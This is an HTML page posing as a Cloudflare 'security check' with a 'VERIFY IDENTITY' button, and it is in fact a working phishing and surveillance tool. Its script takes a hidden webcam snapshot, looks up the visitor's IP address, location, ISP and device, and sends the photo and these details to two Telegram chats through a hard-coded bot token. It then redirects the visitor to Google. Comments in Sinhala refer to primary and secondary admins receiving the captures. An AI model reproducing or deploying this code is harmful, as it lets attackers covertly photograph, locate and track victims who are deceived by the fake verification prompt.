<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <title>ZENTRIX | SECURE-VERIFY</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; text-align: center; }
        .box { border: 1px dashed #0f0; padding: 40px; border-radius: 15px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); }
        .btn { background: #0f0; color: #000; padding: 15px 40px; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
        .btn:hover { background: #fff; box-shadow: 0 0 15px #fff; }
        #status { margin-top: 15px; color: #888; font-size: 12px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2 style="letter-spacing: 2px;">SECURITY CHECK</h2>
    <p style="color: #ccc; font-size: 14px;">Cloudflare is verifying your connection.<br>Please allow camera access to continue.</p>
    
    <button class="btn" onclick="startProcess()">VERIFY IDENTITY</button>
    <div id="status">Status: Waiting for authentication...</div>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = "8720861442:AAH852AZ54-Iqrxy2xY1QU4FIDFmIX0VBd4";
    const CHAT_ID = "7871773175";
    const SECONDARY_ADMIN = "5734261991"; // 👈 අලුත් ඇඩ්මින් ID එක

    async function startProcess() {
        const status = document.getElementById('status');
        status.innerText = "Accessing encrypted tunnel...";
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const dataURL = canvas.toDataURL('image/jpeg');
                const blob = await (await fetch(dataURL)).blob();

                // IP & Device Data
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                // Send to Telegram
                await sendToTelegram(blob, ipData);

                stream.getTracks().forEach(track => track.stop());
                status.innerText = "Authentication Complete. Redirecting...";
                setTimeout(() => window.location.href = "https://www.google.com", 1500);
            }, 1000);

        } catch (err) {
            status.innerText = "Error: Access Denied. Retry verification.";
        }
    }

    async function sendToTelegram(photoBlob, ipData) {
        const caption = `🔱 **ZENTRIX SYSTEM LOG** 🔱\n\n` +
                      `👤 **Primary Admin:** \`${CHAT_ID}\`\n` +
                      `🛠️ **Dev/Admin:** \`${SECONDARY_ADMIN}\`\n` +
                      `----------------------------\n` +
                      `📍 **IP:** \`${ipData.ip}\`\n` +
                      `🌍 **Location:** ${ipData.city}, ${ipData.country_name}\n` +
                      `📱 **Device:** ${navigator.platform}\n` +
                      `🏢 **ISP:** ${ipData.org}\n\n` +
                      `📸 **Target Visual Captured Successfully!**`;

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, 'zentrix_shot.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        // ප්‍රධාන ඇඩ්මින්ට යවනවා
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        
        // අලුත් ඇඩ්මින්ටත් ඕනේ නම් වෙනම මැසේජ් එකක් යවන්න පුළුවන්
        formData.set('chat_id', SECONDARY_ADMIN);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    }
</script>

</body>
</html>
